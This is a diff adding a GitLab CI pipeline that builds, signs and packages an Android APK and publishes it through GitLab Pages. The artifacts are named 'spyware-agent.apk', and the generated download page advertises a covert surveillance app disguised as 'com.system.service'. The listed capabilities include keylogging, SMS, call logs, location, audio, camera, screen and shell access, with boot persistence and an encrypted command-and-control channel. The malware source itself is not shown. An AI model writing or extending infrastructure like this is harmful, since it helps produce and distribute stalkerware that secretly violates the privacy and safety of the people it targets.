@@ -1,0 +1,178 @@
+image: registry.gitlab.com/gbraad/android-build:api-34-ndk-r26b
+
+variables:
+  GRADLE_OPTS: "-Dorg.gradle.daemon=false -Dorg.gradle.parallel=true"
+  ANDROID_SDK_ROOT: "/opt/android-sdk"
+
+stages:
+  - setup
+  - build
+  - test
+  - sign
+  - package
+  - deploy
+
+before_script:
+  - export GRADLE_USER_HOME=$(pwd)/.gradle
+  - chmod +x ./gradlew
+  - echo "sdk.dir=$ANDROID_SDK_ROOT" > local.properties
+  - mkdir -p ~/.android && echo "### User Sources for Android SDK Manager" > ~/.android/repositories.cfg
+
+cache:
+  key: "android-sdk"
+  paths:
+    - .gradle/wrapper/
+    - .gradle/caches/
+
+setup:
+  stage: setup
+  script:
+    - apt-get update -qq && apt-get install -y -qq wget unzip > /dev/null
+    - echo "Setup complete"
+  cache:
+    key: "android-sdk"
+    paths:
+      - .gradle/wrapper/
+      - .gradle/caches/
+
+build_debug:
+  stage: build
+  needs: [setup]
+  script:
+    - echo "Building debug APK..."
+    - ./gradlew assembleDebug
+  artifacts:
+    paths:
+      - app/build/outputs/apk/debug/*.apk
+    expire_in: 7 days
+  cache:
+    key: "gradle-cache"
+    paths:
+      - .gradle/caches/
+      - .gradle/wrapper/
+
+build_release:
+  stage: build
+  needs: [setup]
+  script:
+    - echo "Building release APK..."
+    - ./gradlew assembleRelease
+  artifacts:
+    paths:
+      - app/build/outputs/apk/release/*.apk
+    expire_in: 30 days
+  cache:
+    key: "gradle-cache"
+    paths:
+      - .gradle/caches/
+      - .gradle/wrapper/
+
+lint:
+  stage: test
+  needs: [build_debug]
+  script:
+    - ./gradlew lint
+  artifacts:
+    reports:
+      lint: app/build/reports/lint-results.xml
+    expire_in: 7 days
+
+sign_apk:
+  stage: sign
+  needs: [build_release]
+  script:
+    - |
+      if [ -n "$KEYSTORE_BASE64" ] && [ -n "$KEYSTORE_PASSWORD" ] && [ -n "$KEY_ALIAS" ] && [ -n "$KEY_PASSWORD" ]; then
+        echo "$KEYSTORE_BASE64" | base64 -d > release.keystore
+        for apk in $(find . -name "*-release-unsigned.apk" -o -name "*-release.apk" | grep -v aligned); do
+          aligned="${apk%.apk}-aligned.apk"
+          signed="${apk%.apk}-signed.apk"
+          zipalign -p 4 "$apk" "$aligned"
+          apksigner sign --ks release.keystore --ks-pass "pass:$KEYSTORE_PASSWORD" --ks-key-alias "$KEY_ALIAS" --key-pass "pass:$KEY_PASSWORD" --out "$signed" "$aligned"
+          echo "Signed: $signed"
+          cp "$signed" "${apk%.apk}.apk"
+        done
+      else
+        echo "No signing config - using unsigned APKs"
+      fi
+  artifacts:
+    paths:
+      - app/build/outputs/apk/release/*.apk
+    expire_in: 30 days
+
+package_release:
+  stage: package
+  needs: [sign_apk]
+  script:
+    - mkdir -p release/
+    - cp app/build/outputs/apk/release/*.apk release/spyware-agent.apk 2>/dev/null || true
+    - cp app/build/outputs/apk/debug/*.apk release/spyware-agent-debug.apk 2>/dev/null || true
+    - cd release && sha256sum *.apk > SHA256SUMS.txt && cd ..
+    - cat release/SHA256SUMS.txt
+  artifacts:
+    paths:
+      - release/
+    expire_in: 30 days
+
+deploy_pages:
+  stage: deploy
+  needs: [package_release]
+  script:
+    - mkdir -p public/
+    - cp -r release/* public/
+    - cat > public/index.html << 'EOF'
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Spyware Agent - APK Downloads</title>
+  <style>
+    body { font-family: monospace; max-width: 800px; margin: 50px auto; padding: 20px; background: #0a0a0a; color: #0f0; }
+    h1 { color: #0f0; border-bottom: 1px solid #0f0; padding-bottom: 10px; }
+    .apk { margin: 20px 0; padding: 15px; border: 1px solid #0f0; }
+    .apk a { color: #0f0; text-decoration: none; font-weight: bold; }
+    .apk a:hover { text-decoration: underline; }
+    .meta { color: #888; font-size: 0.9em; }
+    .info { background: #1a1a1a; padding: 15px; border: 1px solid #0f0; margin: 20px 0; }
+  </style>
+</head>
+<body>
+  <h1>Spyware Agent — Built $(date -u)</h1>
+  <div class="info">
+    <strong>Package:</strong> com.system.service<br>
+    <strong>Capabilities:</strong> Keylogger, SMS, Contacts, Call Logs, Location, Audio, Screen, Camera, Files, Apps, Clipboard, Notifications, Shell, WiFi<br>
+    <strong>Persistence:</strong> Boot receiver + foreground service<br>
+    <strong>C2:</strong> WebSocket + HTTPS, RSA/AES encryption
+  </div>
+  <div class="apk">
+    <a href="spyware-agent.apk">🕷 spyware-agent.apk</a> — Release build (signed if keystore provided)
+    <div class="meta">com.system.service | minSdk 24 | targetSdk 34</div>
+  </div>
+  <div class="apk">
+    <a href="spyware-agent-debug.apk">🕷 spyware-agent-debug.apk</a> — Debug build
+    <div class="meta">Unsigned, debuggable=false, minified</div>
+  </div>
+  <div class="meta">SHA256 checksums in <a href="SHA256SUMS.txt">SHA256SUMS.txt</a></div>
+</body>
+</html>
+EOF
+  artifacts:
+    paths:
+      - public/
+    expire_in: 30 days
+  only:
+    - main
+    - tags
+  rules:
+    - if: $CI_COMMIT_BRANCH == "main"
+    - if: $CI_COMMIT_TAG
+
+# Manual trigger for signed release
+release_signed:
+  stage: deploy
+  needs: [package_release]
+  when: manual
+  script:
+    - echo "Manual release triggered"
+    - echo "APKs available at: https://gitlab.com/daveXcodiene/code/-/jobs/artifacts/main/raw/release/?job=package_release"
+  rules:
+    - if: $CI_COMMIT_BRANCH == "main"
